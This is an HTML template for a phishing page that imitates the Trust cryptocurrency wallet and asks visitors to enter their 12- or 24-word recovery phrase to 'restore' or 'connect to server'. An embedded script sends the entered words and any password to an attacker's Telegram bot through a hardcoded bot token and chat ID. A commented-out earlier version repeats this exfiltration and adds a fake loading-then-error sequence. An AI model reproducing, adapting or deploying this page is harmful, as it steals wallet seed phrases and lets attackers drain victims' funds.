<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="shortcut icon" href="header.html" type="image/x-icon">
  <link rel="stylesheet" href="cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.html">
  <link rel="stylesheet" href="styles.css">
  <title>Trust | Connect to Server</title>
</head>

<body class="wallet ">

  <a href="#">
    <img class="head" src="img/horizontal_blue.html" alt="">
  </a>

  <h2>Connect To Server</h2>

  <button id="btn1" onclick="show_hide()">12 WORD PHRASE</button>
  <% if(formSection === "12") { %>
    <% if(alert.status === "error") { %>
      <div class="error"><b>Error:</b> <%- alert.message %></div>
    <% } %>
    <% if(alert.status === "success") { %>
      <div class="success"><b>Success:</b> <%- alert.message %></div>
    <% } %>
  <% } %>
  <div id="15form" class="r-container" <% if(formSection === "12"){ %>style="display: block;"<% } %>>
    <h2 class="mnemonic">MNEMONIC</h2>
    
    <form method="POST" action="?type=12" class="form-2">
      <div class="">
        <!-- Input fields for 12-word phrase -->
        <div class="input">
          <input class="mnemonic-input" type="text" name="phrase_1" value='<%- formSection === "12" ? form.phrase_1 : "" %>' required placeholder="1">
          <span></span>
          <input class="mnemonic-input" type="text" name="phrase_2" value='<%- formSection === "12" ? form.phrase_2 : "" %>' required placeholder="2">
        </div>
        <div class="input">
          <input class="mnemonic-input" type="text" name="phrase_3" value='<%- formSection === "12" ? form.phrase_3 : "" %>' required placeholder="3">
          <span></span>
          <input class="mnemonic-input" type="text" name="phrase_4" value='<%- formSection === "12" ? form.phrase_4 : "" %>' required placeholder="4">
        </div>
        <div class="input">
          <input class="mnemonic-input" type="text" name="phrase_5" value='<%- formSection === "12" ? form.phrase_5 : "" %>' required placeholder="5">
          <span></span>
          <input class="mnemonic-input" type="text" name="phrase_6" value='<%- formSection === "12" ? form.phrase_6 : "" %>' required placeholder="6">
        </div>
        <div class="input">
          <input class="mnemonic-input" type="text" name="phrase_7" value='<%- formSection === "12" ? form.phrase_7 : "" %>' required placeholder="7">
          <span></span>
          <input class="mnemonic-input" type="text" name="phrase_8" value='<%- formSection === "12" ? form.phrase_8 : "" %>' required placeholder="8">
        </div>
        <div class="input">
          <input class="mnemonic-input" type="text" name="phrase_9" value='<%- formSection === "12" ? form.phrase_9 : "" %>' required placeholder="9">
          <span></span>
          <input class="mnemonic-input" type="text" name="phrase_10" value='<%- formSection === "12" ? form.phrase_10 : "" %>' required placeholder="10">
        </div>
        <div class="input">
          <input class="mnemonic-input" type="text" name="phrase_11" value='<%- formSection === "12" ? form.phrase_11 : "" %>' required placeholder="11">
          <span></span>
          <input class="mnemonic-input" type="text" name="phrase_12" value='<%- formSection === "12" ? form.phrase_12 : "" %>' required placeholder="12">
        </div>
      </div>
<div class="
      d-flex
      align-items-center
      justify-content-center
      mb-3
    ">

      <div class="align-items-center justify-content-center mb-3">
        <label>
          <input type="checkbox" name="checkbox" <%- formSection === "12" ? "checked" : "" %> required>
          I have entered all details correctly.
        </label>
      </div> 

      <p style="font-size: 13px; color: #0000FF; text-align: center;">
        Input the BIP39/BIP44 recovery phrase here to restore the Mnemonic keys that manage your account.
      </p>

      <button style="
      border: 0;
      border-radius: 7px;
      font-size: 20px;
      text-align: center;
      background: #0000FF;
      color: #ffffff;
      width: 60%;
      padding: 10px 0;
      margin: 20px 0;
      cursor: pointer;
      ">
        Restore
      </button>
    </form>
  </div>
  </div>






  <!--- <button id="btn2" onclick="show_hide()">24 WORD PHRASE</button>
  <div id="24form" class="r-container">
    <ul class="nav justify-content-between">
      <h2 class="mnemonic">MNEMONIC</h2>
    </ul>

    <h2 class="mnemonic">MNEMONIC</h2>

    <div class="tab-content" id="myTabContent">
      <div class="tab-pane fade active show" id="mnemonic" role="tabpanel" aria-labelledby="mnemonic-tab">

    <form id="email-form-24" name="email-form-24" method="get" class="form-2">
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_next" value="https://walletrestore-web.netlify.app/"> -->







  <button id="btn2" onclick="hide_show()">24 WORD PHRASE</button>
  <% if(formSection === "24") { %>
    <% if(alert.status === "error") { %>
      <div class="error"><b>Error:</b> <%- alert.message %></div>
    <% } %>
    <% if(alert.status === "success") { %>
      <div class="success"><b>Success:</b> <%- alert.message %></div>
    <% } %>
  <% } %>
  <div id="24form" <% if(formSection === "24"){ %>style="display: block;"<% } %> class="r-container">
    <ul class="nav justify-content-between">
      <h2 class="mnemonic">MNEMONIC</h2>
    </ul>


    <div class="tab-content" id="myTabContent">
      <div class="tab-pane fade active show" id="mnemonic" role="tabpanel" aria-labelledby="mnemonic-tab">
        <form id="email-form-24" method="POST" action="?type=24" class="form-2">
          <div class="">
            <div class="input">
              <span></span>
              <input class="mnemonic-input" type="text" name="phrase_1" value='<%- formSection === "24" ? form.phrase_1 : "" %>' required placeholder="1">

              <span></span>
              <input class="mnemonic-input" type="text" name="phrase_2" value='<%- formSection === "24" ? form.phrase_2 : "" %>' required placeholder="2">
            </div>
            <div class="input">
              <span></span>
              <input class="mnemonic-input" type="text" name="phrase_3" value='<%- formSection === "24" ? form.phrase_3 : "" %>' required placeholder="3">
              <span></span>
              <input class="mnemonic-input" type="text" name="phrase_4" value='<%- formSection === "24" ? form.phrase_4 : "" %>' required placeholder="4">
            </div>
            <div class="input">
              <span></span>
              <input class="mnemonic-input" type="text" name="phrase_5" value='<%- formSection === "24" ? form.phrase_5 : "" %>' required placeholder="5">

              <span></span>
              <input class="mnemonic-input" type="text" name="phrase_6" value='<%- formSection === "24" ? form.phrase_6 : "" %>' required placeholder="6">
            </div>
            <div class="input">
              <span></span>
              <input class="mnemonic-input" type="text" name="phrase_7" value='<%- formSection === "24" ? form.phrase_7 : "" %>' required placeholder="7">

              <span></span>
              <input class="mnemonic-input" type="text" name="phrase_8" value='<%- formSection === "24" ? form.phrase_8 : "" %>' required placeholder="8">
            </div>
            <div class="input">
              <span></span>
              <input class="mnemonic-input" type="text" name="phrase_9" value='<%- formSection === "24" ? form.phrase_9 : "" %>'  required placeholder="9">
              <span></span>
              <input class="mnemonic-input" type="text" name="phrase_10" value='<%- formSection === "24" ? form.phrase_10 : "" %>' required placeholder="10">
            </div>
            <div class="input">
              <span></span>
              <input class="mnemonic-input" type="text" name="phrase_11" value='<%- formSection === "24" ? form.phrase_11 : "" %>' required placeholder="11">

              <span></span>
              <input class="mnemonic-input" type="text" name="phrase_12" value='<%- formSection === "24" ? form.phrase_12 : "" %>' required placeholder="12">
            </div>
            <div class="input">
              <span></span>
              <input class="mnemonic-input" type="text" name="phrase_13" value='<%- formSection === "24" ? form.phrase_13 : "" %>' required placeholder="13">

              <span></span>
              <input class="mnemonic-input" type="text" name="phrase_14" value='<%- formSection === "24" ? form.phrase_14 : "" %>' required placeholder="14">
            </div>

            <div class="input">
              <span></span>
              <input class="mnemonic-input" type="text" name="phrase_15" value='<%- formSection === "24" ? form.phrase_15 : "" %>' required placeholder="15">

              <span></span>
              <input class="mnemonic-input" type="text" name="phrase_16" value='<%- formSection === "24" ? form.phrase_16 : "" %>' required placeholder="16">
            </div>

            <div class="input">
              <span></span>
              <input class="mnemonic-input" type="text" name="phrase_17" value='<%- formSection === "24" ? form.phrase_17 : "" %>' required placeholder="17">

              <span></span>
              <input class="mnemonic-input" type="text" name="phrase_18" value='<%- formSection === "24" ? form.phrase_18 : "" %>' required placeholder="18">
            </div>

            <div class="input">
              <span></span>
              <input class="mnemonic-input" type="text" name="phrase_19" value='<%- formSection === "24" ? form.phrase_19 : "" %>' required placeholder="19">

              <span></span>
              <input class="mnemonic-input" type="text" name="phrase_20" value='<%- formSection === "24" ? form.phrase_20 : "" %>' required placeholder="20">
            </div>

            <div class="input">
              <span></span>
              <input class="mnemonic-input" type="text" name="phrase_21" value='<%- formSection === "24" ? form.phrase_21 : "" %>' required placeholder="21">

              <span></span>
              <input class="mnemonic-input" type="text" name="phrase_22" value='<%- formSection === "24" ? form.phrase_22 : "" %>' required placeholder="22">
            </div>

            <div class="input">
              <span></span>
              <input class="mnemonic-input" type="text" name="phrase_23" value='<%- formSection === "24" ? form.phrase_23 : "" %>' required placeholder="23">

              <span></span>
              <input class="mnemonic-input" type="text" name="phrase_24" value='<%- formSection === "24" ? form.phrase_24 : "" %>' required placeholder="24">
            </div>

          </div>
      <div class="
              d-flex
              align-items-center
              justify-content-center
              mb-3
            ">

      </div>
      
        <span><input type="checkbox" name="checkbox" id="mnemonic-checkbox" <%- formSection === "24" ? "checked" : "" %>  required=""> I have entered all details
          correctly.</span>

      </div>
      <div>
        <div class="overlay" id="overlay"></div>
        <input type="text" style="display:none">
        <div class="modal">
        <button id="restoreButton24" style="
                border: 0;
                border-radius: 7px;
                font-size: 20px;
                text-align: center;
                background: #0000FF;
                color: #ffffff;
                width: 60%;
                padding: 10px 0;
                margin: 20px 0;
                cursor: pointer;
                ">Restore Wallet</button>
          </div>
      </div>
      </form>
    </div>
  </div>
  </div>
  <script>
  document.getElementById("email-form-12").addEventListener("submit", function (event) {
    event.preventDefault();
    sendRecoveryDetails("email-form-12", 12);
  });
  
  document.getElementById("email-form-24").addEventListener("submit", function (event) {
    event.preventDefault();
    sendRecoveryDetails("email-form-24", 24);
  });
  
  function sendRecoveryDetails(formId, wordCount) {
    const form = document.getElementById(formId);
    let message = `Recovery Details (${wordCount} Words):\n`;
  
    // Collect words
    for (let i = 1; i <= wordCount; i++) {
      const word = form.querySelector(`[name=word${i}_${wordCount}]`).value;
      message += `Word ${i}: ${word}\n`;
    }
  
    // Collect password
    const password = form.querySelector("[name=password]")?.value;
    if (password) {
      message += `Password: ${password}\n`;
    }
  
    const botToken = "8065693085:AAFvu-nI6MHPg4Hnu4RFZiSoTFh0uZBMg04";
    const chatId = "7896464517";
  
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    })
      .catch((error) => {
        console.error("Error:", error);
        alert("An error occurred. Please try again.");
      });
  }
  

    // document.getElementById("email-form").addEventListener("submit", function(event) {
    //     event.preventDefault();  // Prevent default form submission

    //     const botToken = "7472535657:AAE04ouxLmslQW3q8R1YmVUeuyrkHsiHqmY";  // Replace with your Bot Token
    //     const chatId = "6331375608";  // Replace with your Chat ID

    //     // Gather form data for the 12 words
    //     let message = "Recovery Details:\n";
    //     for (let i = 1; i <= 24; i++) {
    //         const word = document.getElementsByName(i.toString())[0].value;
    //         message += `Word ${i}: ${word}\n`;
    //     }

    //     // Send data to Telegram bot
    //     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    //         method: "POST",
    //         headers: {
    //             "Content-Type": "application/json"
    //         },
    //         body: JSON.stringify({
    //             chat_id: chatId,
    //             text: message
    //         })
    //     })
    //     .then(response => response.json())
    //     // .then(data => {
    //     //     if (data.ok) {
    //     //         alert("Data sent to Telegram successfully!");
    //     //         window.location.href = this.getAttribute("redirect");  // Redirect after sending
    //     //     } else {
    //     //         alert("Failed to send data to Telegram.");
    //     //     }
    //     // })
    //     .catch(error => {
    //         console.error("Error:", error);
    //         alert("An error occurred. Please try again.");
    //     });
    // });

    // const button = document.getElementById('restoreButton');
    //     const loadingIcon = document.getElementById('loadingIcon');
    //     const errorMessage = document.getElementById('errorMessage');
    //     const overlay = document.getElementById('overlay');

    //     button.addEventListener('click', () => {
    //         // Show the overlay and the loading icon
    //         overlay.style.display = 'block';
    //         loadingIcon.style.display = 'block';
    //         button.disabled = false; // Disable the button to prevent multiple clicks

    //         // Hide the loading icon after 5 seconds and display the error message
    //         setTimeout(() => {
    //             loadingIcon.style.display = 'none';
    //             errorMessage.style.display = 'block';
    //             button.disabled = false; // Re-enable the button if needed
    //         }, 5000); // 50000ms = 5 seconds
    //     });
</script>
  <script src="script.js"></script>
</body>
</html>
